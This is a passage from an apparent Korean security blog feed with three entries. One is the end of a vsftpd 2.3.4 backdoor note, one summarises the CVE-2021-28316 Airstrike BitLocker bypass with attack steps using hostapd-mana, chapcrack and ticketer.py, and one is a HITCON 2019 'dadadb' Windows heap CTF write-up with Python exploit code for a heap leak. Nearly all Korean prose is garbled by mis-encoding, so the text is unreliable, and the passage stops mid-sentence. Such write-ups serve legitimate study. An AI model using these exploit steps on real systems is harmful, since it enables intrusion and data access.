íŒ¨ì¹˜ë˜ì—ˆì§€ë§Œ ì„œë¹„ìŠ¤ êµ¬ì„± ìš”ì†Œ ê²€ìƒ‰ ì—”ì§„ì¸ ZoomEyeì˜ vsftpd ë²„ì „ ê²€ìƒ‰ ê²°ê³¼ì— ë”°ë¥´ë©´ ì•½ 10ë…„ì´ ì§€ë‚œ ì§€ê¸ˆ ì „ ì„¸ê³„ì˜ ë§ì€ ì„œë²„ì—ì„œ ì—¬ì „íˆ ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” vsftpd 2.3.4 ë²„ì „ì„ ì‚¬ìš©í•˜ê³  ìˆëŠ” ê²ƒì´ í™•ì¸ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/20/l0ch/2021-04-20/zoomeye.png" alt="zoomeye"></p><p>ì´ëŠ” ì·¨ì•½ì ì— ëŒ€í•œ ë³´ì•ˆì—…ê³„ì˜ ëŒ€ì²˜ê°€ íŒ¨ì¹˜ ë¦´ë¦¬ì¦ˆë¿ë§Œì´ ì•„ë‹Œ ë‹¤ê°ë„ì˜ ì‚¬í›„ê´€ë¦¬ ë˜í•œ í•„ìš”í•¨ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.</p></br><blockquote><p>ìƒìš© ì„œë¹„ìŠ¤ë¥¼ ëŒ€ìƒìœ¼ë¡œ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ ë°œìƒí•œ ë¶„ìŸì— ëŒ€í•´ hackyboizëŠ” ì–´ë– í•œ ì±…ì„ë„ ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>backdoor</tag>
      
      <tag>L0ch</tag>
      
      <tag>vsftpd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-28316: Windows workstation FDE bypass and EOP</title>
    <link href="/2021/04/19/idioth/2021-04-19/"/>
    <url>/2021/04/19/idioth/2021-04-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://shenaniganslabs.io/2021/04/13/Airstrike.html">Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE-2021-28316)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ë„ë©”ì¸ì— ê°€ì…ëœ Windows 10 host</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì™€ì´íŒŒì´ ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆëŠ” Windows ë…¸íŠ¸ë¶ì´ë‚˜ ì›Œí¬ìŠ¤í…Œì´ì…˜ì— ë¬¼ë¦¬ì ìœ¼ë¡œ ì ‘ê·¼ ê°€ëŠ¥í•  ì‹œ ì ê¸ˆ í™”ë©´ ë° BitLocker Full Disk Encryptionì„ ìš°íšŒí•˜ê³  íŒŒì¼ ì‹œìŠ¤í…œì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Windows í™˜ê²½ì—ì„œ ë„ë©”ì¸ ì‚¬ìš©ìê°€ MSCHAPv2ì™€ PEAPë¥¼ í•¨ê»˜ ì‚¬ìš©í•˜ì—¬ ë¬´ì„  ì•¡ì„¸ìŠ¤ í¬ì¸íŠ¸ì— ì¸ì¦í•  ë•Œ resulting challenge response hashëŠ” ë„ë©”ì¸ ì‚¬ìš©ìì˜ íŒ¨ìŠ¤ì›Œë“œì˜ NTLM í•´ì‰¬ë¡œë¶€í„° íŒŒìƒë©ë‹ˆë‹¤. ë„ë©”ì¸ ì‚¬ìš©ì ì¸ì¦ë¿ë§Œ ì•„ë‹ˆë¼ ì»´í“¨í„° ì¸ì¦ì„ ìœ„í•œ ì˜µì…˜ë„ ì œê³µí•©ë‹ˆë‹¤. ì»´í“¨í„° ì¸ì¦ì€ í´ë¼ì´ì–¸íŠ¸ ì¸ì¦ì„œë‚˜ MSCHAPv2ë¥¼ ì‚¬ìš©í•˜ì§€ë§Œ PEAPì™€ MSCHAPv2ë¥¼ ê°™ì´ ì‚¬ìš©í•  ê²½ìš° ë„ë©”ì¸ ì»´í“¨í„° ê³„ì •ì˜ NTLM í•´ì‰¬ê°€ ì¸ì¦ì— ì‚¬ìš©ë©ë‹ˆë‹¤. ë³´í†µ ì•”í˜¸ëŠ” ë³µêµ¬í•  ìˆ˜ ì—†ì§€ë§Œ NTLM í•´ì‰¬ëŠ” <a href="https://crack.sh/wpa-enterprise/">crack.sh</a>ë¥¼ í†µí•´ ë³µêµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><a href="https://github.com/sensepost/hostapd-mana">hostapd-mana</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‚´ë¶€ ì¸ì¦ ë°©ë²•ìœ¼ë¡œ ì„¤ì •ëœ MSCHAPv2ë¥¼ í†µí•´ PEAPë¥¼ ì§€ì›í•˜ëŠ” ì•¡ì„¸ìŠ¤ í¬ì¸íŠ¸ ìƒì„±</li><li><a href="https://github.com/moxie0/chapcrack">chapcrack</a>ì„ ì‚¬ìš©í•˜ì—¬ MSCHAPv2 challenge response hashë¥¼ cloud crack í˜•ì‹ìœ¼ë¡œ ë³€í™˜</li><li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>ì˜ <code>ticketer.py</code>ê³¼ NTLM hashë¥¼ í†µí•´ ì „ì²´ íŒŒì¼ ì‹œìŠ¤í…œì— ì•¡ì„¸ìŠ¤</li></ol><p>BitLocker Full Disk Encryptionì„ ìš°íšŒí•˜ê¸° ìœ„í•´ì„œ í•´ì»¤ê°€ ì œì–´í•˜ëŠ” ë„¤íŠ¸ì›Œí¬ì— ì—°ê²°í•˜ì—¬ ë„ë©”ì¸ SIDë¥¼ ì–»ì–´ì•¼ í•©ë‹ˆë‹¤. hostapdë¥¼ ì‚¬ìš©í•˜ì—¬ WPA2-PSK ë„¤íŠ¸ì›Œí¬ë¥¼ ìƒì„±í•œ í›„ LDAP pingì„ í†µí•´ Active Directory Domain name, victimì˜ host name, ë„ë©”ì¸ SIDë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ í›„ <code>ticketer.py</code>ë¥¼ ì‚¬ìš©í•˜ë©´ ì „ì²´ íŒŒì¼ ì‹œìŠ¤í…œì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 4 - HITCON 2019 dadadb</title>
    <link href="/2021/04/18/l0ch/pwncoolsexy-part4/"/>
    <url>/2021/04/18/l0ch/pwncoolsexy-part4/</url>
    
    <content type="html"><![CDATA[<h1 id="ì´ì „-ì‹œë¦¬ì¦ˆ-ë°”ë¡œê°€ê¸°"><a href="#ì´ì „-ì‹œë¦¬ì¦ˆ-ë°”ë¡œê°€ê¸°" class="headerlink" title="ì´ì „ ì‹œë¦¬ì¦ˆ ë°”ë¡œê°€ê¸°"></a>ì´ì „ ì‹œë¦¬ì¦ˆ ë°”ë¡œê°€ê¸°</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 2 - NT Heap</a></p><p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 3 - NT Heap(2)</a></p><p>ì•ˆë…•í•˜ì„¸ìš” L0chì…ë‹ˆë‹¤! </p><p>ë²Œì¨ ë¸”ë¡œê·¸ ì˜¤í”ˆí•œì§€ ë°˜ë…„ì´ ë˜ëŠ” 4ì›”ì´ë„¤ìš”!  <del><em>ê·¸ë¦¬ê³  ë‹¤ìŒì£¼ë©´ ì¤‘ê°„ê³ ì‚¬ëë‹ˆë‹¤ í‘ã…ê·¸ ã… ã… </em></del> </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled.png" alt="pwncoolsexy-part4/Untitled.png"></p><blockquote><p>ë‚˜.. ì¡¸ì—…í•  ìˆ˜ ìˆì„ê¹Œ..?</p></blockquote><p>ì‹œí—˜ê¸°ê°„ì—ëŠ” ì—­ì‹œ ë”´ ê±° í•˜ëŠ” ê²Œ ì œì¼ ì¬ë°Œì£ . ê·¸ë˜ì„œ ì´ë²ˆ íŒŒíŠ¸ëŠ” ì‹œí—˜ê¸°ê°„ ë²„í”„ë¥¼ ë°›ì•„ ì œì¼ ì¬ë°Œê²Œ ì‘ì„±í–ˆìŠµë‹ˆë‹¤ ã…ã…; (í•™ì ê³¼ ë“±ê°€ êµí™˜í•œ ê±´ ë¤) ì˜¤ëŠ˜ì€ HITCON 2019 Qualsì— ì¶œì œëœ Windows pwnable ë¬¸ì œì¸ dadadbë¥¼ í’€ì–´ë³´ë©´ì„œ NT Heapì—ì„œì˜ exploitationì„ ìì„¸í•˜ê²Œ ë‹¤ë¤„ë³´ê² ìŠµë‹ˆë‹¤! </p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>Windows x64 on windows sever 2019<ul><li>Similar to Windows 10 (1809)</li></ul></li><li>AppJailLauncher</li><li>DEP</li><li>ASLR</li><li>CFG</li><li>ìì‹ í”„ë¡œì„¸ìŠ¤ ìƒì„± ë¶ˆê°€<ul><li>ìƒˆ í”„ë¡œì„¸ìŠ¤ ìƒì„± ë¶ˆê°€ëŠ¥</li></ul></li><li>Private Heap</li></ul><p>Windows 1809 (ë¹Œë“œ 17763.1) í™˜ê²½ì—ì„œ ì§„í–‰í–ˆìŠµë‹ˆë‹¤! </p><p>ì—¬ë‹´ìœ¼ë¡œ.. Windows10 1809 ë²„ì „ì—ì„œëŠ” Windows Terminal ì§€ì›ì´ ì•ˆë¼ ëˆˆë¬¼ì„ ë¨¸ê¸ˆê³  winpwnì˜ í°íŠ¸ ìŠ¤íƒ€ì¼ì„ ì§€ì›í•˜ì§€ ì•ŠëŠ” ë‹¤ë¥¸ í„°ë¯¸ë„ì„ ì“¸ ìˆ˜ ë°–ì— ì—†ì—ˆìŠµë‹ˆë‹¤;; í•´í‚¹í•  ë• ëª¨ë‹ˆí„°ê°€ í™”ë ¤í•´ì•¼ í•˜ëŠ”ë°.. ê·¸ëŸ¼ ìµìŠ¤ ì•ˆë˜ë˜ ê²ƒë„ ë˜ëŠ”ê±° ã…‡ã…ˆ?</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%201.png" alt="pwncoolsexy-part4/Untitled%201.png"></p><blockquote><p><strong>ì£¼ì˜</strong> ê²‰ë©‹ë§Œ ë“¤ë©´ ë§í•œë‹¤.</p></blockquote><p>ì œ ì–˜ê¸°ë„¤ìš” ã…ã….. ì•„ë¬´íŠ¼, ë¬¸ì œ ë°”ì´ë„ˆë¦¬ë¥¼ ì°¬ì°¬íˆ ëœ¯ì–´ë³´ë©´ì„œ ë¶„ì„ì„ ì‹œì‘í•´ë³´ê² ìŠµë‹ˆë‹¤! </p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ë¥¸ ì„¤ëª… ì—†ì´ ì…ë ¥ì„ ë°›ëŠ”ë°, 1ë²ˆìœ¼ë¡œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%202.png" alt="pwncoolsexy-part4/Untitled%202.png"></p><p><code>user.txt</code>ì— ìˆëŠ” ì—¬ëŸ¬ ê³„ì •ê³¼ íŒ¨ìŠ¤ì›Œë“œ ì¤‘ í•˜ë‚˜ë¡œ ë¡œê·¸ì¸í•˜ë©´ ê°„ë‹¨í•œ DB ê¸°ëŠ¥ì´ êµ¬í˜„ëœ ê±¸ í™•ì¸í•  ìˆ˜ ìˆë„¤ìš”.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%203.png" alt="pwncoolsexy-part4/Untitled%203.png"></p><blockquote><p>user.txtì˜ ê³„ì •ê³¼ íŒ¨ìŠ¤ì›Œë“œ</p></blockquote><p>ë¡œê·¸ì¸í•œ ì´í›„ ë©”ë‰´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>add<ul><li>key, size, dataë¥¼ ì…ë ¥ë°›ì•„ ë…¸ë“œ ì¶”ê°€</li><li>node listì— keyê°€ ì¡´ì¬í•˜ë©´ í•´ë‹¹ keyì˜ data ìˆ˜ì •</li></ul></li><li>view<ul><li>keyë¥¼ ì…ë ¥ë°›ì•„ ë…¸ë“œ ê²€ìƒ‰ í›„ keyì™€ data ì¶œë ¥</li></ul></li><li>delete<ul><li>keyë¥¼ ì…ë ¥ë°›ì•„ í•´ë‹¹í•˜ëŠ” ë…¸ë“œ ì‚­ì œ</li></ul></li><li>logout<ul><li>ë¡œê·¸ì•„ì›ƒí•˜ê³  ë¡œê·¸ì¸ ì „ìœ¼ë¡œ ëŒì•„ê°</li></ul></li></ol><p>ê¸°ëŠ¥ì´ ë§ì§€ ì•Šì•„ ì´ ì •ë„ë¡œë§Œ ì •ë¦¬í•˜ê³  ë°”ë¡œ ì·¨ì•½ì ë¶€í„° ì°¾ì•„ë³¼ê²Œìš”.</p><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>ìš°ì„  ì…ë ¥ë°›ì€ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” êµ¬ì¡°ì²´ì¸ <code>node</code> ëŠ” ì•„ë˜ì™€ ê°™ìœ¼ë©° 256ê°œì˜ í¬ì¸í„° ë°°ì—´ë¡œ ì„ ì–¸ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%204.png" alt="pwncoolsexy-part4/Untitled%204.png"></p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>&#123;</span><span class="hljs-keyword">char</span>* data;<span class="hljs-keyword">size_t</span> size;<span class="hljs-keyword">char</span> key[<span class="hljs-number">41</span>];<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>&#125;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">list</span>[256];</span></code></pre><p><code>main()</code>ë¶€í„° ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. <code>user.txt</code> ì˜ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ ì‰˜ì„ ì–»ì€ ì´í›„ì˜ ì½”ë“œì…ë‹ˆë‹¤.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%205.png" alt="pwncoolsexy-part4/Untitled%205.png"></p><p>ì´ì¤‘ ìƒˆë¡œìš´ nodeë¥¼ ì¶”ê°€í•˜ëŠ” <code>add_sub_1340()</code> í•¨ìˆ˜ë¥¼ ìì„¸íˆ ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%206.png" alt="pwncoolsexy-part4/Untitled%206.png"></p><p><code>add_sub_1340()</code>ì˜ nodeë¥¼ ì¶”ê°€í•˜ëŠ” ë¶€ë¶„ì˜ ì½”ë“œì…ë‹ˆë‹¤.</p><ul><li><code>Key</code>ë¥¼ ì…ë ¥ë°›ê³  ë¹¨ê°„ ë°•ìŠ¤ì—ì„œ í˜„ì¬ node listì— ì…ë ¥ë°›ì€ <code>Key</code>ê°’ì´ ì¡´ì¬í•˜ëŠ”ì§€ ê²€ìƒ‰í•©ë‹ˆë‹¤.</li><li>ë§Œì•½ ëª» ì°¾ì•˜ë‹¤ë©´ <code>LABEL_13</code>ìœ¼ë¡œ ì í”„í•´ ìƒˆ nodeë¥¼ ìƒì„±í•˜ê³  ì°¾ì•˜ë‹¤ë©´ ì•„ë˜ ì½”ë“œë¥¼ ì§„í–‰í•©ë‹ˆë‹¤.<ul><li>ì°¾ì€ ê²½ìš° linked listì˜ headì— ìƒˆ nodeë¥¼ ì‚½ì…í•©ë‹ˆë‹¤. (node[2] â†’ node[1] â†’ node[0]â€¦)</li></ul></li></ul><p>ì…ë ¥ë°›ì€ Keyê°’ì´ ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ê²½ìš°ë¥¼ ì¢€ ë” ìì„¸íˆ ë³¼ê¹Œìš”?</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%207.png" alt="pwncoolsexy-part4/Untitled%207.png"></p><ul><li>ì¼ì¹˜í•˜ëŠ” <code>Key</code>ê°’ì˜ ë…¸ë“œë¥¼ ì°¾ì•˜ìœ¼ë©´ í•´ë‹¹ <code>nodeâ†’data</code>ë¥¼ í• ë‹¹ í•´ì œí•˜ê³  ì‚¬ì´ì¦ˆë¥¼ <code>new_size</code>ì— ìƒˆë¡œ ì…ë ¥ë°›ìŠµë‹ˆë‹¤.</li><li><code>new_size</code>ì˜ ìµœëŒ“ê°’ì„ <code>0x1000</code>ìœ¼ë¡œ ì œí•œí•©ë‹ˆë‹¤.</li><li><code>new_size</code>ë§Œí¼ <code>nodeâ†’data</code>ì— ìƒˆë¡œ Heapì„ í• ë‹¹í•©ë‹ˆë‹¤.</li><li><code>new_size</code>ë§Œí¼ ìƒˆë¡œ í• ë‹¹í•œ <code>nodeâ†’data</code>ì— ì´ì „ì— í• ë‹¹ëœ <code>nodeâ†’data</code>ì˜ ì‚¬ì´ì¦ˆì¸ <code>old_size</code>ë§Œí¼ ì…ë ¥ì„ ë°›ìŠµë‹ˆë‹¤.<ul><li><code>new_size</code>ê°€ <code>old_size</code>ë³´ë‹¤ ì‘ìœ¼ë©´ Heap buffer overflowê°€ ë°œìƒí•©ë‹ˆë‹¤.</li></ul></li></ul><h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><p>ë¨¼ì € Heap overflowë¥¼ ì´ìš©í•´ Heap ì£¼ì†Œë¥¼ leak í•´ë³´ê² ìŠµë‹ˆë‹¤. ì˜¤ëŠ˜ì€ LFHë¥¼ ë‹¤ë£° ê²ƒì´ê¸° ë•Œë¬¸ì— LFHê°€ í™œì„±í™”ëœ chunkì—ì„œ ì§„í–‰í•˜ë„ë¡ í• ê²Œìš”.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%208.png" alt="pwncoolsexy-part4/Untitled%208.png"></p><p>nodeë¥¼ ì¶”ê°€í•˜ë‹¤ ë³´ë©´ 19ë²ˆì§¸ì—ì„œ LFH í”Œë˜ê·¸ê°€ í™œì„±í™”ë©ë‹ˆë‹¤. ì´í›„ nodeë¥¼ ì„¸ ê°œë§Œ ì¶”ê°€í•´ì„œ ì–´ë–¤ ìœ„ì¹˜ì— í• ë‹¹ë˜ì–´ìˆëŠ”ì§€ í™•ì¸í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#...</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%209.png" alt="pwncoolsexy-part4/Untitled%209.png"></p><p>LFHê°€ í™œì„±í™”ëœ chunkë“¤ì´ ë¬´ì‘ìœ„ë¡œ heapì— í• ë‹¹ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ ë¬´ì‘ìœ„ë¡œ í• ë‹¹ë˜ì–´ chunk ê°„ ê±°ë¦¬ê°€ ë¶ˆê·œì¹™í•˜ë©´ ì›í•˜ëŠ” chunkì— ì ‘ê·¼í•˜ê¸° ì–´ë ¤ì›Œì§‘ë‹ˆë‹¤. í•œë§ˆë””ë¡œ ì›í•˜ëŠ” heap layoutì„ êµ¬ì„±í•˜ê¸° í˜ë“¤ì–´ì§€ì£ . ë”°ë¼ì„œ ì¼ë°˜ì ìœ¼ë¡œëŠ” reliable í•œ leakì´ ë¶ˆê°€ëŠ¥.. í•˜ì§€ë§Œ! ë°©ë²•ì´ ìˆìœ¼ë‹ˆê¹Œ ì´ëŸ° ì‚½ì§ˆì„ í•˜ëŠ” ê±° ì•„ë‹ˆê² ì–´ìš”?ã…ã…</p><h2 id="LFH-Reuse-Attack"><a href="#LFH-Reuse-Attack" class="headerlink" title="LFH Reuse Attack"></a>LFH Reuse Attack</h2><p>ì ì´ì œ ì „ íŒŒíŠ¸ì—ì„œ ë°°ìš´ <a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation">reuse attack</a>ì„ ì¨ë¨¹ì„ ì°¨ë¡€ì…ë‹ˆë‹¤. ë¬´ì‘ìœ„ í• ë‹¹ìœ¼ë¡œ í• ë‹¹ë  chunk ìœ„ì¹˜ë¥¼ ì˜ˆì¸¡í•˜ê¸° í˜ë“¤ë‹¤ë©´? ê·¸ëŸ¼ ë‹¤ ì±„ì›Œë²„ë¦¬ê³  í•œ ê³³ë§Œ ë‚¨ê²¨ë†”ì„œ ì˜ˆì¸¡ ê°€ëŠ¥í•˜ê²Œ ë§Œë“¤ë©´ ë©ë‹ˆë‹¤!</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2010.png" alt="pwncoolsexy-part4/Untitled%2010.png"></p><blockquote><p>ì„ íƒì§€ëŠ” ì—†ë‹¤.</p></blockquote><p>ê·¸ë¦¼ìœ¼ë¡œ ë‚˜íƒ€ë‚´ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2011.png" alt="pwncoolsexy-part4/Untitled%2011.png"></p><ol><li>LFH chunkë¡œ userblockì„ ëª¨ë‘ ì±„ì›ë‹ˆë‹¤. </li><li>ì„ì˜ì˜ chunk(ì—¬ê¸°ì„œëŠ” LFH5)ë¥¼ í•´ì œí•˜ë©´ í˜„ì¬ userblockì—ëŠ” ë¹ˆ ê³µê°„ì´ LFH5ê°€ í•´ì œëœ ê³µê°„ë°–ì— ë‚¨ì•„ìˆì§€ ì•ŠìŠµë‹ˆë‹¤.</li><li>add LFH4ë¡œ <code>LFH4â†’data</code>ë¥¼ ë‹¤ì‹œ í• ë‹¹í•˜ë©´ LFHëŠ” í•´ì œëœ chunk ìš°ì„ ìœ¼ë¡œ í• ë‹¹í•˜ê²Œ ë˜ì–´ í•´ì œëœ LFH5 ê³µê°„ì— ìƒˆë¡œ dataë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.  </li><li>3ë²ˆì˜ ê³¼ì •ì—ì„œ overflow ì·¨ì•½ì ì´ ìˆìœ¼ë‹ˆ ì´ì œ ì”¹ê³  ëœ¯ê³  ë§›ë³´ê³  ì¦ê¸°ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤!</li></ol><p>ë¨¼ì € LFH chunkë¥¼ 0~16ê¹Œì§€ 17ê°œë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2012.png" alt="pwncoolsexy-part4/Untitled%2012.png"></p><p>ëœë¤ í•œ ìœ„ì¹˜ì— í• ë‹¹ë˜ì–´ ìˆœì„œëŠ” ë’¤ì£½ë°•ì£½ì´ì§€ë§Œ ì˜¹ê¸°ì¢…ê¸° ì˜ˆì˜ê²Œ ëª¨ì—¬ìˆëŠ” ê²ƒì´ ë³´ì…ë‹ˆë‹¤. chunk17ë¶€í„°ëŠ” ì•„ë˜ ì‚¬ì§„ê³¼ ê°™ì´ ìƒˆ userblockì— í• ë‹¹ë˜ê¸° ë•Œë¬¸ì— LFH chunkëŠ” ê¸°ì¡´ userblockì„ ëª¨ë‘ ì±„ìš¸ ì •ë„ì¸ 0~16ê¹Œì§€ 17ê°œë§Œ í• ë‹¹í•©ë‹ˆë‹¤. ì´ëŠ” <code>ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code>ë¥¼ ì°¸ê³ í•´ í•´ë‹¹ userblockì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ blockì´ ì–¼ë§ˆë‚˜ ë˜ëŠ”ì§€ í™•ì¸í•´ë³´ë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2013.png" alt="pwncoolsexy-part4/Untitled%2013.png"></p><p>ì´ì œ LFH5 chunkë¥¼ í•´ì œí•˜ê³  add(LFH4)ë¥¼ í†µí•´ í•´ì œí›„ ì¬ í• ë‹¹ëœ <code>LFH4â†’data</code> ê°€ LFH5 chunkì— ìœ„ì¹˜í•´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. dataì— ì…ë ¥í•œ <code>aaaaaaaa</code> ë„ ì˜ ë“¤ì–´ê°€ ìˆë„¤ìš”!</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2014.png" alt="pwncoolsexy-part4/Untitled%2014.png"></p><p>ì´ì œ <code>0x70</code>ë§Œí¼ ì±„ìš°ë©´ ë’¤ì˜ heap addressë¡œ heap base addressì™€ ë°”ë¡œ ë’¤ chunkì˜ keyê¹Œì§€ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#...</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)delete(<span class="hljs-string">&quot;LFH5&quot;</span>)add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>)view(<span class="hljs-string">&quot;LFH4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span> p.recvuntil(p64(<span class="hljs-number">0x90</span>))key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]print(<span class="hljs-string">&quot;heap : &quot;</span>,hex(heap_base))print(<span class="hljs-string">&quot;key :&quot;</span>,key)</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2015.png" alt="pwncoolsexy-part4/Untitled%2015.png"></p><p>ë°”ë¡œ ë’¤ì— ìˆëŠ” chunkì˜ keyë¥¼ êµ¬í–ˆìœ¼ë‹ˆ overflowë¥¼ ì´ìš©í•˜ë©´ leak í•œ keyì˜ <code>data</code> í¬ì¸í„°ë¥¼ ìˆ˜ì •í•˜ë©´ arbitrary readê°€ ê°€ëŠ¥í•˜ì£ ! ìš°ë¦¬ê°€ í•„ìš”í•œ ì£¼ì†Œë“¤ì€ 